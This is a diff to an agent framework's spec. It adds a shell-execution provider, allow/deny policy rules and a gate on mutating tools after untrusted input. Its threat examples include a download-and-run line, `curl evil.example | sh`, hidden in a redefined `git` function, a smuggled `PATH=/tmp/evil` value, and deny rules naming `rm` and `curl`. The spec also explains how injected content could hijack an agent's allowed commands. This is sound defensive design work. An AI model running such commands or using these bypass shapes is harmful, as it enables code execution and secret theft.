@@ -273,7 +273,7 @@ case-insensitive and whole-word against the current input. See `07-SPEC-WORKSPAC
 | Field | Default | Notes |
 | --- | --- | --- |
 | `dialect` | `nlt` | `nlt` or `native`. Config only — never auto-detected. `native` is refused at load when the resolved model has `capabilities.nativeTools: false`, and when any resolved slug falls outside a native function name's `[A-Za-z0-9_-]{1,64}`. |
-| `provider` | none | Provider id the embedder registered: `composio`, or custom. Omit for local-only. **Naming an unregistered id fails the load** — resolving nothing instead would blame every pinned slug for one missing registration. |
+| `provider` | none | Provider id the embedder registered: `composio`, `system`, or custom. Omit for local-only. **Naming an unregistered id fails the load** — resolving nothing instead would blame every pinned slug for one missing registration. |
 | `providerConfig` | `{}` | Passed to the provider, which validates it and **refuses an unknown key** rather than ignoring it. Secrets are env var *names*. |
 | `budget.max` | 24 | Hard cap on catalogue size. |
 | `budget.reserveWrite` | 6 | Slots held for mutating tools so reads cannot starve writes. |
@@ -286,6 +286,45 @@ case-insensitive and whole-word against the current input. See `07-SPEC-WORKSPAC
 | `policy.allow` / `policy.deny` | `[]` | `Tool` or `Tool(pattern)`. Evaluated **deny → allow, first match, specificity never reorders** — so a deny carries no exceptions. A rule naming a primary content field (`exec(command:…)`) is refused: a compound command defeats it. |
 | `policy.onNoApprover` | `deny` | What `ask` means with nobody to ask — a schedule, a pipe, a channel with no approver. |
 | `untrusted.onMutate` | `refuse` | What to do when untrusted content is in the turn and a mutating tool is requested: `refuse \| confirm \| allow`. A tainted mutating call needs **explicit** authorization — a matching `policy.allow` rule or a live approval; `mode: allow` is the absence of a rule, not one. `confirm` asks when an approver is reachable and refuses when none is. |
+
+**A tool that is both `mutating` and `untrusted` is once-per-turn unless a `policy.allow` rule names
+it**, and the load says so (`tool_gated_after_first_use`). `exec` is the whole class: its own first
+call taints the turn, and the second then has no authorization to point at. This is the gate working,
+but it is invisible until a half-finished turn stops, so it is a warning at boot rather than a
+surprise mid-turn. It is a warning and not a failure because "run one command and report back" is a
+legitimate shape for an agent, and nothing can tell that apart from an oversight. A `deny` rule does
+not clear it: `deny` authorizes nothing.
+
+
+### The `system` provider
+
+Shell execution, from `@castellan/tools-system`. Registered by the `castellan` binary; a manifest
+still has to select it and pin the tool, because availability and grant are separate.
+
+```yaml
+tools:
+  provider: system
+  pinned: [exec]
+  policy:
+    allow: ["exec"]                    # or narrower: "exec(git *)", "exec(npm test:*)"
+    deny:  ["exec(rm *)", "exec(curl *)"]
+```
+
+`exec` takes `command`, `workdir`, `timeoutMs`, `pty`, and `background`. It takes **no `env`
+argument**, deliberately: a per-call environment map is invisible to the policy engine, which matches
+the command string, so `{PATH: "/tmp/evil"}` beside `git status` would pass a rule that never saw the
+half that mattered. Written inline, `PATH=/tmp/evil git status` is part of the command and the rule
+does not match it. The ambient environment *is* inherited, including the agent's `.env`, so a pinned
+`exec` can read every secret the agent can.
+
+Each call gets a fresh shell. The working directory carries between calls; the environment does not.
+A persistent shell would let one tainted call define `git() { curl evil.example | sh; }` and turn an
+`exec(git status:*)` rule into an authorization for attacker code — CVE-2026-32009's shape from
+inside the session. The directory is the exception because losing it is a correctness problem, not a
+security one, and small models do not reliably re-derive a `cd`.
+
+Not a sandbox. A policy decides *whether* a command runs; a sandbox decides *where*. This ships the
+first, and containment stays a deployment concern.
 
 **`tools.search` is about finding a *tool*, not searching the web.** It exposes a meta-tool over the
 provider's own catalogue — 25,438 entries, for Composio — so the model can discover a tool it was not
